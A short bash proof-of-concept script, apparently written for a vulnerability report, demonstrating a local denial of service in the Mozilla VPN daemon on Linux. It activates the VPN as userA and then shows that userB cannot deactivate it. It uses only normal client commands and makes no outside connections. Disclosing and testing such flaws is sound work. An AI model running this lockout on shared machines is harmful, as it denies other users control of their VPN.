#!/bin/bash

# PoC for Linux Session Locking DoS
# This script demonstrates how a user can lock the VPN session, preventing others from using it.

# Prerequisites:
# 1. Mozilla VPN daemon running (systemd service)
# 2. Two user accounts: userA and userB

# Step 1: Activate VPN as userA
echo "[*] Activating VPN as userA..."
sudo -u userA mozillavpn activate
sleep 2

# Step 2: Verify VPN is active
STATUS=$(sudo -u userA mozillavpn status)
if [[ "$STATUS" == *"Connected"* ]]; then
    echo "[+] VPN activated by userA."
else
    echo "[-] Failed to activate VPN."
    exit 1
fi

# Step 3: Simulate userA logout
# In a real scenario, this happens when userA logs out of the desktop session.
# The daemon receives 'UserRemoved' signal from logind.
# We can simulate the effect by ensuring userA is gone but daemon persists.
# However, for this PoC, we just switch to userB while userA's session is technically "active" in the daemon's memory (m_sessionUid).

echo "[*] Switching to userB..."

# Step 4: Attempt to control VPN as userB
echo "[*] Attempting to deactivate VPN as userB..."
OUTPUT=$(sudo -u userB mozillavpn deactivate 2>&1)

# Step 5: Check result
if [[ "$OUTPUT" == *"Insufficient caller permissions"* ]] || [[ "$OUTPUT" == *"Authorization failed"* ]]; then
    echo "[+] PoC Successful: userB cannot deactivate userA's session."
    echo "    The daemon is locked to userA (m_sessionUid)."
else
    echo "[-] PoC Failed: userB was able to control the session."
    echo "    Output: $OUTPUT"
fi

# Cleanup
sudo -u userA mozillavpn deactivate
